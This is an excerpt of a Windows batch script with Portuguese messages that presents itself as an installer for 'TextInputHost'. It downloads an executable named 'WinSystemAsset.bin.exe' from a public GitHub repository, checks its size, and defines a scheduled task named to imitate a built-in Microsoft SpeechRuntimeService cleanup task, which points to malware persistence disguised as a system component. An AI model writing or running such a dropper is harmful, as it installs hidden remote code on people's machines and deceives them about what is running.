...
echo.
echo ================================================
echo   INSTALACAO DO SISTEMA - TextInputHost
echo ================================================
echo.

rem --- CONFIGURACAO ---
set "REPO_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/WinSystemAsset.bin.exe"
...
if !size! LSS 50000 (
    ...
    echo Verifique se o repositorio 'unknow2' e PUBLICO e o nome e 'WinSystemAsset.bin'.
...
set "TASK_NAME=Microsoft\Windows\SpeechRuntimeService\Cleanup"
